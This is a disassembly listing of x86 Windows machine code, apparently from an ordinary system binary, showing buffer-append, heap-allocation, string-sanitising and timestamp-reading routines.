  405d17:	mov    ebx,DWORD PTR [ebp+0x8]
  405d1a:	lea    ecx,[ebx+0x1]
  405d1d:	mov    al,BYTE PTR [ebx]
  405d1f:	inc    ebx
  405d20:	test   al,al
  405d22:	jne    0x405d1d
  405d24:	sub    ebx,ecx
  405d26:	jmp    0x405d2a
  405d28:	xor    ebx,ebx
  405d2a:	cmp    DWORD PTR [ebp+0x8],0x0
  405d2e:	je     0x405de7
  405d34:	test   ebx,ebx
  405d36:	je     0x405de7
  405d3c:	mov    eax,DWORD PTR [esi+0x10]
  405d3f:	lea    ecx,[ebx+eax*1]
  405d42:	cmp    ecx,eax
  405d44:	jb     0x405e56
  405d4a:	cmp    ecx,DWORD PTR [esi+0x8]
  405d4d:	jbe    0x405db1
  405d4f:	mov    edx,DWORD PTR [esi+0xc]
  405d52:	dec    edx
  405d53:	lea    eax,[edx+ecx*1]
  405d56:	cmp    eax,ecx
  405d58:	jb     0x405e44
  405d5e:	not    edx
  405d60:	and    eax,edx
  405d62:	cmp    DWORD PTR [esi+0x14],0x0
  405d66:	mov    DWORD PTR [ebp-0x4],eax
  405d69:	push   eax
  405d6a:	jne    0x405d90
  405d6c:	push   0x0
  405d6e:	push   DWORD PTR [esi]
  405d70:	call   DWORD PTR ds:0x40a1b8
  405d76:	mov    DWORD PTR [ebp-0x8],eax
  405d79:	test   eax,eax
  405d7b:	je     0x405da1
  405d7d:	push   DWORD PTR [ebp-0x4]
  405d80:	push   0x0
  405d82:	push   eax
  405d83:	call   0x407abc
  405d88:	mov    eax,DWORD PTR [ebp-0x8]
  405d8b:	add    esp,0xc
  405d8e:	jmp    0x405d9d
  405d90:	push   DWORD PTR [esi+0x14]
  405d93:	push   0x0
  405d95:	push   DWORD PTR [esi]
  405d97:	call   DWORD PTR ds:0x40a180
  405d9d:	test   eax,eax
  405d9f:	jne    0x405da8
  405da1:	mov    eax,0xc0000017
  405da6:	jmp    0x405ddf
  405da8:	mov    DWORD PTR [esi+0x14],eax
  405dab:	mov    eax,DWORD PTR [ebp-0x4]
  405dae:	mov    DWORD PTR [esi+0x8],eax
  405db1:	mov    eax,DWORD PTR [esi+0x14]
  405db4:	add    eax,DWORD PTR [esi+0x10]
  405db7:	push   ebx
  405db8:	push   DWORD PTR [ebp+0x8]
  405dbb:	push   eax
  405dbc:	call   0x407ab0
  405dc1:	mov    eax,DWORD PTR [esi+0x10]
  405dc4:	add    esp,0xc
  405dc7:	lea    ecx,[ebx+eax*1]
  405dca:	cmp    ecx,eax
  405dcc:	jb     0x405e4b
  405dce:	mov    DWORD PTR [esi+0x10],ecx
  405dd1:	mov    eax,DWORD PTR [esi+0x4]
  405dd4:	cmp    eax,ecx
  405dd6:	ja     0x405dda
  405dd8:	mov    eax,ecx
  405dda:	mov    DWORD PTR [esi+0x4],eax
  405ddd:	xor    eax,eax
  405ddf:	test   eax,eax
  405de1:	jne    0x405eaf
  405de7:	cmp    DWORD PTR [ebp+0xc],0x0
  405deb:	je     0x405ead
  405df1:	test   edi,edi
  405df3:	je     0x405ead
  405df9:	mov    eax,DWORD PTR [esi+0x10]
  405dfc:	lea    ecx,[eax+edi*1]
  405dff:	cmp    ecx,eax
  405e01:	jb     0x405e56
  405e03:	cmp    ecx,DWORD PTR [esi+0x8]
  405e06:	jbe    0x405e7b
  405e08:	mov    eax,DWORD PTR [esi+0xc]
  405e0b:	dec    eax
  405e0c:	lea    ebx,[eax+ecx*1]
  405e0f:	cmp    ebx,ecx
  405e11:	jb     0x405eb8
  405e17:	not    eax
  405e19:	and    ebx,eax
  405e1b:	cmp    DWORD PTR [esi+0x14],0x0
  405e1f:	push   ebx
  405e20:	jne    0x405e5d
  405e22:	push   0x0
  405e24:	push   DWORD PTR [esi]
  405e26:	call   DWORD PTR ds:0x40a1b8
  405e2c:	mov    DWORD PTR [ebp-0x8],eax
  405e2f:	test   eax,eax
  405e31:	je     0x405e6e
  405e33:	push   ebx
  405e34:	push   0x0
  405e36:	push   eax
  405e37:	call   0x407abc
  405e3c:	mov    eax,DWORD PTR [ebp-0x8]
  405e3f:	add    esp,0xc
  405e42:	jmp    0x405e6a
  405e44:	mov    eax,0xc0000095
  405e49:	jmp    0x405ddf
  405e4b:	or     DWORD PTR [esi+0x10],0xffffffff
  405e4f:	mov    eax,0xc0000095
  405e54:	jmp    0x405eaf
  405e56:	mov    eax,0xc000000d
  405e5b:	jmp    0x405eaf
  405e5d:	push   DWORD PTR [esi+0x14]
  405e60:	push   0x0
  405e62:	push   DWORD PTR [esi]
  405e64:	call   DWORD PTR ds:0x40a180
  405e6a:	test   eax,eax
  405e6c:	jne    0x405e75
  405e6e:	mov    eax,0xc0000017
  405e73:	jmp    0x405ea9
  405e75:	mov    DWORD PTR [esi+0x14],eax
  405e78:	mov    DWORD PTR [esi+0x8],ebx
  405e7b:	mov    eax,DWORD PTR [esi+0x14]
  405e7e:	add    eax,DWORD PTR [esi+0x10]
  405e81:	push   edi
  405e82:	push   DWORD PTR [ebp+0xc]
  405e85:	push   eax
  405e86:	call   0x407ab0
  405e8b:	mov    eax,DWORD PTR [esi+0x10]
  405e8e:	add    esp,0xc
  405e91:	lea    ecx,[eax+edi*1]
  405e94:	cmp    ecx,eax
  405e96:	jb     0x405e4b
  405e98:	mov    DWORD PTR [esi+0x10],ecx
  405e9b:	mov    eax,DWORD PTR [esi+0x4]
  405e9e:	cmp    eax,ecx
  405ea0:	ja     0x405ea4
  405ea2:	mov    eax,ecx
  405ea4:	mov    DWORD PTR [esi+0x4],eax
  405ea7:	xor    eax,eax
  405ea9:	test   eax,eax
  405eab:	jne    0x405eaf
  405ead:	xor    eax,eax
  405eaf:	pop    edi
  405eb0:	pop    esi
  405eb1:	pop    ebx
  405eb2:	mov    esp,ebp
  405eb4:	pop    ebp
  405eb5:	ret    0x8
  405eb8:	mov    eax,0xc0000095
  405ebd:	jmp    0x405ea9
  405ebf:	int3   
  405ec0:	int3   
  405ec1:	int3   
  405ec2:	int3   
  405ec3:	int3   
  405ec4:	int3   
  405ec5:	int3   
  405ec6:	int3   
  405ec7:	int3   
  405ec8:	int3   
  405ec9:	int3   
  405eca:	int3   
  405ecb:	int3   
  405ecc:	int3   
  405ecd:	int3   
  405ece:	int3   
  405ecf:	int3   
  405ed0:	mov    edi,edi
  405ed2:	ret    
  405ed3:	int3   
  405ed4:	int3   
  405ed5:	int3   
  405ed6:	int3   
  405ed7:	int3   
  405ed8:	mov    edi,edi
  405eda:	push   ebp
  405edb:	mov    ebp,esp
  405edd:	push   ecx
  405ede:	push   ecx
  405edf:	push   ebx
  405ee0:	xor    ebx,ebx
  405ee2:	push   esi
  405ee3:	inc    ebx
  405ee4:	push   edi
  405ee5:	mov    eax,ebx
  405ee7:	lock xadd DWORD PTR ds:0x4093b4,eax
  405eef:	inc    eax
  405ef0:	cmp    eax,ebx
  405ef2:	jne    0x405ef9
  405ef4:	call   0x402c97
  405ef9:	mov    eax,fs:0x30
  405eff:	push   0x88
  405f04:	push   0x8
  405f06:	push   DWORD PTR [eax+0x18]
  405f09:	call   DWORD PTR ds:0x40a1b8
  405f0f:	mov    edi,eax
  405f11:	mov    DWORD PTR [ebp-0x8],edi
  405f14:	test   edi,edi
  405f16:	jne    0x405f37
  405f18:	push   0x402530
  405f1d:	push   0x78
  405f1f:	push   0x402540
  405f24:	push   ebx
  405f25:	mov    esi,0xc0000017
  405f2a:	call   0x4052c4
  405f2f:	add    esp,0x10
  405f32:	jmp    0x406028
  405f37:	lea    eax,[edi+0x50]
  405f3a:	push   eax
  405f3b:	call   DWORD PTR ds:0x40a194
  405f41:	push   0x401520
  405f46:	push   0x40
  405f48:	push   edi
  405f49:	call   DWORD PTR ds:0x40a168
  405f4f:	add    esp,0xc
  405f52:	lea    esi,[edi+0x48]
  405f55:	push   0x40235f
  405f5a:	push   esi
  405f5b:	call   DWORD PTR ds:0x40a19c
  405f61:	mov    eax,fs:0x30
  405f67:	push   ebx
  405f68:	push   0x8
  405f6a:	push   DWORD PTR [eax+0x18]
  405f6d:	call   DWORD PTR ds:0x40a1b8
  405f73:	mov    ecx,eax
  405f75:	mov    DWORD PTR [edi+0x4c],ecx
  405f78:	test   ecx,ecx
  405f7a:	jne    0x405f86
  405f7c:	mov    esi,0xc0000017
  405f81:	jmp    0x40601d
  405f86:	movzx  eax,WORD PTR [esi]
  405f89:	push   eax
  405f8a:	push   0x40235f
  405f8f:	push   ecx
  405f90:	call   0x407ab0
  405f95:	mov    esi,DWORD PTR ds:0x7ffe0004
  405f9b:	mov    edx,0x7ffe0324
  405fa0:	mov    ebx,0x7ffe0320
  405fa5:	mov    DWORD PTR [ebp-0x4],esi
  405fa8:	mov    ecx,0x7ffe0328
  405fad:	add    esp,0xc
  405fb0:	mov    edx,DWORD PTR [edx]
  405fb2:	mov    ebx,DWORD PTR [ebx]
  405fb4:	mov    eax,DWORD PTR [ecx]
  405fb6:	cmp    edx,eax
  405fb8:	je     0x405fd7
  405fba:	lea    esi,[ecx-0x4]
  405fbd:	lea    edi,[ecx-0x8]
  405fc0:	pause  
  405fc2:	mov    edx,DWORD PTR [esi]
  405fc4:	mov    ebx,DWORD PTR [edi]
  405fc6:	mov    ecx,DWORD PTR [ecx]
  405fc8:	cmp    edx,ecx
  405fca:	mov    ecx,0x7ffe0328
  405fcf:	jne    0x405fc0
  405fd1:	mov    edi,DWORD PTR [ebp-0x8]
  405fd4:	mov    esi,DWORD PTR [ebp-0x4]
  405fd7:	mov    eax,edx
  405fd9:	mul    esi
  405fdb:	mov    ecx,eax
  405fdd:	mov    esi,edx
  405fdf:	mov    eax,ebx
  405fe1:	mul    DWORD PTR [ebp-0x4]
  405fe4:	shld   esi,ecx,0x8
  405fe8:	shrd   eax,edx,0x18
  405fec:	shl    ecx,0x8
  405fef:	shr    edx,0x18
  405ff2:	add    ecx,eax
  405ff4:	mov    DWORD PTR [edi+0x80],ecx
  405ffa:	lea    ecx,[edi+0x68]
  405ffd:	adc    esi,edx
  405fff:	sub    esp,0xc
  406002:	mov    DWORD PTR [edi+0x84],esi
  406008:	call   0x406bb3
  40600d:	mov    esi,eax
  40600f:	test   esi,esi
  406011:	js     0x40601d
  406013:	mov    DWORD PTR ds:0x4093a8,edi
  406019:	xor    edi,edi
  40601b:	mov    esi,edi
  40601d:	test   edi,edi
  40601f:	je     0x406028
  406021:	mov    ecx,edi
  406023:	call   0x406036
  406028:	pop    edi
  406029:	mov    eax,esi
  40602b:	pop    esi
  40602c:	pop    ebx
  40602d:	mov    esp,ebp
  40602f:	pop    ebp
  406030:	ret    
  406031:	int3   
  406032:	int3   
  406033:	int3   
  406034:	int3   
  406035:	int3   
  406036:	mov    edi,edi
  406038:	push   ebp
  406039:	mov    ebp,esp
  40603b:	and    esp,0xfffffff8
  40603e:	push   ecx
  40603f:	push   ebx
  406040:	push   esi
  406041:	mov    esi,ecx
  406043:	push   edi
  406044:	test   esi,esi
  406046:	je     0x40604d
  406048:	call   0x406126
  40604d:	or     eax,0xffffffff
  406050:	lock xadd DWORD PTR ds:0x4093b4,eax
  406058:	push   0x0
  40605a:	pop    ebx
  40605b:	jne    0x406081
  40605d:	push   DWORD PTR ds:0x40902c
  406063:	push   DWORD PTR ds:0x409028
  406069:	call   DWORD PTR ds:0x40a008
  40606f:	mov    DWORD PTR ds:0x409028,ebx
  406075:	mov    DWORD PTR ds:0x40902c,ebx
  40607b:	mov    DWORD PTR ds:0x409010,ebx
  406081:	test   esi,esi
  406083:	je     0x4060d5
  406085:	lea    edi,[esi+0x68]
  406088:	cmp    DWORD PTR [edi+0x14],0x0
  40608c:	je     0x40609a
  40608e:	push   DWORD PTR [edi+0x14]
  406091:	push   ebx
  406092:	push   DWORD PTR [edi]
  406094:	call   DWORD PTR ds:0x40a170
  40609a:	push   0x6
  40609c:	xor    eax,eax
  40609e:	pop    ecx
  40609f:	rep stos DWORD PTR es:[edi],eax
  4060a1:	mov    edx,DWORD PTR [esi+0x4c]
  4060a4:	test   edx,edx
  4060a6:	je     0x4060ba
  4060a8:	mov    ecx,DWORD PTR fs:0x30
  4060af:	mov    ecx,DWORD PTR [ecx+0x18]
  4060b2:	call   0x406c89
  4060b7:	mov    DWORD PTR [esi+0x4c],ebx
  4060ba:	lea    eax,[esi+0x50]
  4060bd:	push   eax
  4060be:	call   DWORD PTR ds:0x40a18c
  4060c4:	mov    ecx,DWORD PTR fs:0x30
  4060cb:	mov    edx,esi
  4060cd:	mov    ecx,DWORD PTR [ecx+0x18]
  4060d0:	call   0x406c89
  4060d5:	pop    edi
  4060d6:	pop    esi
  4060d7:	pop    ebx
  4060d8:	mov    esp,ebp
  4060da:	pop    ebp
  4060db:	ret    
  4060dc:	int3   
  4060dd:	int3   
  4060de:	int3   
  4060df:	int3   
  4060e0:	int3   
  4060e1:	mov    edi,edi
  4060e3:	push   ebp
  4060e4:	mov    ebp,esp
  4060e6:	mov    dx,WORD PTR [ebp+0x8]
  4060ea:	xor    eax,eax
  4060ec:	mov    ecx,DWORD PTR [ebp+0xc]
  4060ef:	push   esi
  4060f0:	xor    esi,esi
  4060f2:	cmp    ax,dx
  4060f5:	jae    0x40611c
  4060f7:	push   ebx
  4060f8:	mov    bl,BYTE PTR [ecx]
  4060fa:	lea    eax,[ebx-0x20]
  4060fd:	cmp    al,0x5e
  4060ff:	ja     0x40610b
  406101:	cmp    bl,0x3b
  406104:	je     0x40610b
  406106:	cmp    bl,0x22
  406109:	jne    0x406112
  40610b:	mov    BYTE PTR [ecx],0x5f
  40610e:	mov    dx,WORD PTR [ebp+0x8]
  406112:	inc    esi
  406113:	movzx  eax,dx
  406116:	inc    ecx
  406117:	cmp    esi,eax
  406119:	jb     0x4060f8
  40611b:	pop    ebx
  40611c:	pop    esi
  40611d:	pop    ebp
  40611e:	ret    0x8
  406121:	int3   
  406122:	int3   
  406123:	int3   
  406124:	int3   
  406125:	int3   
  406126:	mov    edi,edi
  406128:	push   ebp
  406129:	mov    ebp,esp
  40612b:	and    esp,0xfffffff8
  40612e:	sub    esp,0x164
  406134:	mov    eax,ds:0x409004
  406139:	xor    eax,esp
  40613b:	mov    DWORD PTR [esp+0x160],eax
  406142:	push   ebx
  406143:	mov    ebx,ecx
  406145:	mov    DWORD PTR [esp+0xc],ebx
  406149:	push   esi
  40614a:	push   edi
  40614b:	test   ebx,ebx
  40614d:	je     0x40663c
  406153:	xor    eax,eax
  406155:	lea    edi,[esp+0xa0]
  40615c:	push   0x6
  40615e:	pop    esi
  40615f:	mov    ecx,esi
  406161:	mov    edx,0x1000
  406166:	rep stos DWORD PTR es:[edi],eax
  406168:	mov    eax,fs:0x30
  40616e:	lea    edi,[esp+0x70]
  406172:	mov    ecx,esi
  406174:	mov    DWORD PTR [esp+0xac],edx
  40617b:	mov    eax,DWORD PTR [eax+0x18]
  40617e:	mov    DWORD PTR [esp+0xa0],eax
  406185:	xor    eax,eax
  406187:	rep stos DWORD PTR es:[edi],eax
  406189:	mov    eax,fs:0x30
  40618f:	lea    edi,[esp+0x40]
  406193:	mov    ecx,esi
  406195:	mov    DWORD PTR [esp+0x7c],edx
  406199:	mov    eax,DWORD PTR [eax+0x18]
  40619c:	mov    DWORD PTR [esp+0x70],eax
  4061a0:	xor    eax,eax
  4061a2:	rep stos DWORD PTR es:[edi],eax
  4061a4:	mov    eax,fs:0x30
  4061aa:	lea    edi,[esp+0x88]
  4061b1:	mov    ecx,esi
  4061b3:	mov    DWORD PTR [esp+0x4c],edx
  4061b7:	mov    eax,DWORD PTR [eax+0x18]
  4061ba:	mov    DWORD PTR [esp+0x40],eax
  4061be:	xor    eax,eax
  4061c0:	rep stos DWORD PTR es:[edi],eax
  4061c2:	mov    eax,fs:0x30
  4061c8:	lea    edi,[esp+0x28]
  4061cc:	mov    ecx,esi
  4061ce:	mov    DWORD PTR [esp+0x94],edx
  4061d5:	mov    eax,DWORD PTR [eax+0x18]
  4061d8:	mov    DWORD PTR [esp+0x88],eax
  4061df:	xor    eax,eax
  4061e1:	rep stos DWORD PTR es:[edi],eax
  4061e3:	mov    eax,fs:0x30
  4061e9:	lea    edi,[esp+0x58]
  4061ed:	mov    ecx,esi
  4061ef:	mov    DWORD PTR [esp+0x34],edx
  4061f3:	mov    eax,DWORD PTR [eax+0x18]
  4061f6:	mov    DWORD PTR [esp+0x28],eax
  4061fa:	xor    eax,eax
  4061fc:	rep stos DWORD PTR es:[edi],eax
  4061fe:	mov    eax,fs:0x30
  406204:	mov    DWORD PTR [esp+0x64],edx
  406208:	mov    eax,DWORD PTR [eax+0x18]
  40620b:	mov    DWORD PTR [esp+0x58],eax
  40620f:	lea    eax,[ebx+0x50]
  406212:	push   eax
  406213:	call   DWORD PTR ds:0x40a1bc
  406219:	mov    eax,DWORD PTR [ebx+0x70]
  40621c:	xor    esi,esi
  40621e:	test   eax,eax
  406220:	je     0x406521
  406226:	mov    edi,esi
  406228:	lea    eax,[ebx+0x68]
  40622b:	mov    DWORD PTR [esp+0x10],edi
  40622f:	push   edi
  406230:	mov    ecx,eax
  406232:	call   0x406a70
  406237:	mov    ecx,DWORD PTR [ebx+0x70]
  40623a:	mov    esi,eax
  40623c:	dec    ecx
  40623d:	cmp    edi,ecx
  40623f:	mov    edi,0x402554
  406244:	je     0x40624b
  406246:	mov    edi,0x402558
  40624b:	mov    eax,DWORD PTR [esi]
  40624d:	lea    ecx,[esp+0xa0]
  406254:	push   edi
  406255:	push   DWORD PTR [eax*4+0x40256c]
  40625c:	call   0x405cd6
  406261:	test   eax,eax
  406263:	js     0x406521
  406269:	push   DWORD PTR [esi+0x8]
  40626c:	push   DWORD PTR [esi+0x4]
  40626f:	call   0x4060e1
  406274:	push   edi
  406275:	push   DWORD PTR [esi+0x8]
  406278:	lea    ecx,[esp+0x60]
  40627c:	call   0x405cd6
  406281:	test   eax,eax
  406283:	js     0x406521
  406289:	push   DWORD PTR [esi+0x10]
  40628c:	push   DWORD PTR [esi+0xc]
  40628f:	call   0x4060e1
  406294:	push   edi
  406295:	push   DWORD PTR [esi+0x10]
  406298:	lea    ecx,[esp+0x78]
  40629c:	call   0x405cd6
  4062a1:	test   eax,eax
  4062a3:	js     0x406521
  4062a9:	push   DWORD PTR [esi+0x20]
  4062ac:	lea    eax,[esp+0x160]
  4062b3:	push   0x40255c
  4062b8:	push   0x10
  4062ba:	push   eax
  4062bb:	call   DWORD PTR ds:0x40a160
  4062c1:	add    esp,0x10
  4062c4:	cmp    eax,0xffffffff
  4062c7:	je     0x406521
  4062cd:	push   edi
  4062ce:	lea    eax,[esp+0x160]
  4062d5:	push   eax
  4062d6:	lea    ecx,[esp+0x48]
  4062da:	call   0x405cd6
  4062df:	test   eax,eax
  4062e1:	js     0x406521
  4062e7:	push   DWORD PTR [esi+0x14]
  4062ea:	lea    eax,[esp+0x160]
  4062f1:	push   0x40255c
  4062f6:	push   0x10
  4062f8:	push   eax
  4062f9:	call   DWORD PTR ds:0x40a160
  4062ff:	add    esp,0x10
  406302:	cmp    eax,0xffffffff
  406305:	je     0x406521
  40630b:	push   edi
  40630c:	lea    eax,[esp+0x160]
  406313:	push   eax
  406314:	lea    ecx,[esp+0x90]
  40631b:	call   0x405cd6
  406320:	test   eax,eax
  406322:	js     0x406521
  406328:	push   DWORD PTR [esi+0x1c]
  40632b:	push   DWORD PTR [esi+0x18]
  40632e:	call   0x4060e1
  406333:	push   edi
  406334:	push   DWORD PTR [esi+0x1c]
  406337:	lea    ecx,[esp+0x30]
  40633b:	call   0x405cd6
  406340:	test   eax,eax
  406342:	js     0x406521
  406348:	mov    eax,fs:0x30
  40634e:	mov    edx,DWORD PTR [esi+0x8]
  406351:	mov    ecx,DWORD PTR [eax+0x18]
  406354:	call   0x406c89
  406359:	mov    eax,fs:0x30
  40635f:	xor    edi,edi
  406361:	mov    edx,DWORD PTR [esi+0x10]
  406364:	mov    DWORD PTR [esi+0x8],edi
  406367:	mov    ecx,DWORD PTR [eax+0x18]
  40636a:	call   0x406c89
  40636f:	mov    eax,fs:0x30
  406375:	mov    edx,DWORD PTR [esi+0x1c]
  406378:	mov    DWORD PTR [esi+0x10],edi
  40637b:	mov    ecx,DWORD PTR [eax+0x18]
  40637e:	call   0x406c89
  406383:	mov    DWORD PTR [esi+0x1c],edi
  406386:	lea    eax,[ebx+0x68]
  406389:	mov    edi,DWORD PTR [esp+0x10]
  40638d:	inc    edi
  40638e:	mov    DWORD PTR [esp+0x10],edi
  406392:	cmp    edi,DWORD PTR [ebx+0x70]
  406395:	jb     0x40622f
  40639b:	xor    esi,esi
  40639d:	cmp    DWORD PTR ds:0x409010,0x5
  4063a4:	jbe    0x406519
  4063aa:	mov    ecx,DWORD PTR ds:0x40901c
  4063b0:	mov    edi,0x2000
  4063b5:	and    ecx,edi
  4063b7:	mov    eax,esi
  4063b9:	or     eax,ecx
  4063bb:	je     0x406519
  4063c1:	mov    ecx,DWORD PTR ds:0x409024
  4063c7:	mov    eax,ecx
  4063c9:	and    eax,edi
  4063cb:	cmp    esi,DWORD PTR ds:0x409020
  4063d1:	jne    0x406519
  4063d7:	cmp    eax,ecx
  4063d9:	jne    0x406519
  4063df:	lea    eax,[ebx+0x40]
  4063e2:	mov    DWORD PTR [esp+0xdc],esi
  4063e9:	mov    edx,ebx
  4063eb:	mov    DWORD PTR [esp+0xd8],eax
  4063f2:	lea    ecx,[esp+0xe8]
  4063f9:	mov    DWORD PTR [esp+0xe0],0x8
  406404:	mov    DWORD PTR [esp+0xe4],esi
  40640b:	call   0x402dbd
  406410:	mov    edx,DWORD PTR [esp+0x6c]
  406414:	lea    ecx,[esp+0xf8]
  40641b:	call   0x402dbd
  406420:	mov    edx,DWORD PTR [esp+0xb4]
  406427:	lea    ecx,[esp+0x108]
  40642e:	call   0x402dbd
  406433:	mov    edx,DWORD PTR [esp+0x84]
  40643a:	lea    ecx,[esp+0x118]
  406441:	call   0x402dbd
  406446:	mov    edx,DWORD PTR [esp+0x54]
  40644a:	lea    ecx,[esp+0x128]
  406451:	call   0x402dbd
  406456:	mov    edx,DWORD PTR [esp+0x9c]
  40645d:	lea    ecx,[esp+0x138]
  406464:	call   0x402dbd
  406469:	mov    edx,DWORD PTR [esp+0x3c]
  40646d:	lea    ecx,[esp+0x148]
  406474:	call   0x402dbd
  406479:	mov    al,ds:0x4028bf
  40647e:	mov    ecx,0x4027c9
  406483:	movzx  eax,WORD PTR ds:0x4027ca
  40648a:	sub    ecx,0x4027b8
  406490:	mov    DWORD PTR [esp+0x1c],eax
  406494:	or     ecx,0xb000000
  40649a:	mov    eax,ds:0x409014
  40649f:	mov    DWORD PTR [esp+0xb8],eax
  4064a6:	mov    DWORD PTR [esp+0x18],ecx
  4064aa:	mov    DWORD PTR [esp+0x20],esi
  4064ae:	mov    DWORD PTR [esp+0x24],edi
  4064b2:	mov    DWORD PTR [esp+0xbc],esi
  4064b9:	movzx  eax,WORD PTR [eax]
  4064bc:	mov    DWORD PTR [esp+0xc0],eax
  4064c3:	lea    eax,[esp+0xb8]
  4064ca:	push   eax
  4064cb:	push   0xa
  4064cd:	push   esi
  4064ce:	push   esi
  4064cf:	lea    eax,[esp+0x28]
  4064d3:	mov    DWORD PTR [esp+0xd4],0x2
  4064de:	push   eax
  4064df:	push   DWORD PTR ds:0x40902c
  4064e5:	mov    DWORD PTR [esp+0xe0],0x4027d4
  4064f0:	push   DWORD PTR ds:0x409028
  4064f6:	mov    DWORD PTR [esp+0xe8],esi
  4064fd:	mov    DWORD PTR [esp+0xec],0x6d
  406508:	mov    DWORD PTR [esp+0xf0],0x1
  406513:	call   DWORD PTR ds:0x40a010
  406519:	lea    ecx,[ebx+0x68]
  40651c:	call   0x406a32
  406521:	xor    edi,edi
  406523:	cmp    DWORD PTR [ebx+0x70],edi
  406526:	jbe    0x406580
  406528:	lea    eax,[ebx+0x68]
  40652b:	push   edi
  40652c:	mov    ecx,eax
  40652e:	call   0x406a70
  406533:	mov    ecx,DWORD PTR fs:0x30
  40653a:	mov    esi,eax
  40653c:	mov    edx,DWORD PTR [esi+0x8]
  40653f:	mov    ecx,DWORD PTR [ecx+0x18]
  406542:	call   0x406c89
  406547:	mov    ecx,DWORD PTR fs:0x30
  40654e:	and    DWORD PTR [esi+0x8],0x0
  406552:	mov    edx,DWORD PTR [esi+0x1c]
  406555:	mov    ecx,DWORD PTR [ecx+0x18]
  406558:	call   0x406c89
  40655d:	mov    ecx,DWORD PTR fs:0x30
  406564:	and    DWORD PTR [esi+0x1c],0x0
  406568:	mov    edx,DWORD PTR [esi+0x10]
  40656b:	mov    ecx,DWORD PTR [ecx+0x18]
  40656e:	call   0x406c89
  406573:	and    DWORD PTR [esi+0x10],0x0
  406577:	lea    eax,[ebx+0x68]
  40657a:	inc    edi
  40657b:	cmp    edi,DWORD PTR [ebx+0x70]
  40657e:	jb     0x40652b
  406580:	lea    ecx,[ebx+0x68]
  406583:	call   0x406a32
  406588:	mov    esi,DWORD PTR ds:0x7ffe0004
  40658e:	mov    edx,0x7ffe0324
  406593:	mov    edi,0x7ffe0320
  406598:	mov    DWORD PTR [esp+0x10],esi
  40659c:	mov    ecx,0x7ffe0328
  4065a1:	mov    edx,DWORD PTR [edx]
  4065a3:	mov    edi,DWORD PTR [edi]
  4065a5:	mov    eax,DWORD PTR [ecx]
  4065a7:	cmp    edx,eax
  4065a9:	je     0x4065ca
  4065ab:	lea    esi,[ecx-0x4]
  4065ae:	lea    ebx,[ecx-0x8]
  4065b1:	pause  
  4065b3:	mov    edx,DWORD PTR [esi]
  4065b5:	mov    edi,DWORD PTR [ebx]
  4065b7:	mov    ecx,DWORD PTR [ecx]
  4065b9:	cmp    edx,ecx
  4065bb:	mov    ecx,0x7ffe0328
  4065c0:	jne    0x4065b1
  4065c2:	mov    ebx,DWORD PTR [esp+0x14]
  4065c6:	mov    esi,DWORD PTR [esp+0x10]
  4065ca:	mov    eax,edx
  4065cc:	mul    esi
  4065ce:	mov    ecx,eax
  4065d0:	mov    esi,edx
  4065d2:	mov    eax,edi
  4065d4:	mul    DWORD PTR [esp+0x10]
  4065d8:	shld   esi,ecx,0x8
  4065dc:	shrd   eax,edx,0x18
  4065e0:	shl    ecx,0x8
  4065e3:	shr    edx,0x18
  4065e6:	add    ecx,eax
  4065e8:	lea    eax,[ebx+0x50]
  4065eb:	mov    DWORD PTR [ebx+0x80],ecx
  4065f1:	adc    esi,edx
  4065f3:	push   eax
  4065f4:	mov    DWORD PTR [ebx+0x84],esi
  4065fa:	call   DWORD PTR ds:0x40a190
  406600:	lea    ecx,[esp+0x58]
  406604:	call   0x405cb0
  406609:	lea    ecx,[esp+0x28]
  40660d:	call   0x405cb0
  406612:	lea    ecx,[esp+0x88]
  406619:	call   0x405cb0
  40661e:	lea    ecx,[esp+0x40]
  406622:	call   0x405cb0
  406627:	lea    ecx,[esp+0x70]
  40662b:	call   0x405cb0
  406630:	lea    ecx,[esp+0xa0]
  406637:	call   0x405cb0
  40663c:	mov    ecx,DWORD PTR [esp+0x16c]
  406643:	pop    edi
  406644:	pop    esi
  406645:	pop    ebx
  406646:	xor    ecx,esp
  406648:	call   0x407330
  40664d:	mov    esp,ebp
  40664f:	pop    ebp
  406650:	ret    
  406651:	int3   
  406652:	int3   
  406653:	int3   
  406654:	int3   
  406655:	int3   
  406656:	mov    edi,edi
  406658:	push   ebp
  406659:	mov    ebp,esp
  40665b:	and    esp,0xfffffff8
  40665e:	sub    esp,0x34
  406661:	push   ebx
  406662:	push   esi
  406663:	push   edi
  406664:	mov    esi,ecx
  406666:	lea    edi,[esp+0x1c]
  40666a:	push   0x9
  40666c:	pop    ecx
  40666d:	xor    eax,eax
  40666f:	mov    DWORD PTR [esp+0x10],esi
  406673:	rep stos DWORD PTR es:[edi],eax
  406675:	lea    eax,[esi+0x50]
  406678:	mov    ebx,edx
  40667a:	push   eax
  40667b:	call   DWORD PTR ds:0x40a1bc
  406681:	xor    eax,eax
  406683:	mov    DWORD PTR [esp+0xc],eax
  406687:	cmp    DWORD PTR [esi+0x70],eax
  40668a:	jbe    0x406718
  406690:	lea    ecx,[esi+0x68]
  406693:	push   eax
  406694:	call   0x406a70
  406699:	mov    edi,eax
  40669b:	mov    ecx,DWORD PTR [edi]
  40669d:	cmp    ecx,DWORD PTR [ebx]
  40669f:	jne    0x406706
  4066a1:	push   0x0
  4066a3:	lea    ecx,[ebx+0xc]
  4066a6:	push   ecx
  4066a7:	lea    ecx,[edi+0xc]
  4066aa:	push   ecx
  4066ab:	call   DWORD PTR ds:0x40a1a0
  4066b1:	test   al,al
  4066b3:	je     0x406706
  4066b5:	push   0x0
  4066b7:	lea    eax,[esi+0x48]
  4066ba:	push   eax
  4066bb:	lea    eax,[edi+0x4]
  4066be:	push   eax
  4066bf:	call   DWORD PTR ds:0x40a1a0
  4066c5:	test   al,al
  4066c7:	je     0x406706
  4066c9:	mov    eax,DWORD PTR [ebx]
  4066cb:	sub    eax,0x0
  4066ce:	je     0x4066fb
  4066d0:	sub    eax,0x1
  4066d3:	je     0x4066ee
  4066d5:	sub    eax,0x1
  4066d8:	jne    0x406706
  4066da:	push   eax
  4066db:	lea    eax,[ebx+0x18]
  4066de:	push   eax
  4066df:	lea    eax,[edi+0x18]
  4066e2:	push   eax
  4066e3:	call   DWORD PTR ds:0x40a1a0
  4066e9:	movzx  eax,al
  4066ec:	jmp    0x4066fe
  4066ee:	mov    eax,DWORD PTR [edi+0x14]
  4066f1:	sub    eax,DWORD PTR [ebx+0x14]
  4066f4:	neg    eax
  4066f6:	sbb    eax,eax
  4066f8:	inc    eax
  4066f9:	jmp    0x4066fe
  4066fb:	xor    eax,eax
  4066fd:	inc    eax
  4066fe:	test   eax,eax
  406700:	jne    0x4067ea
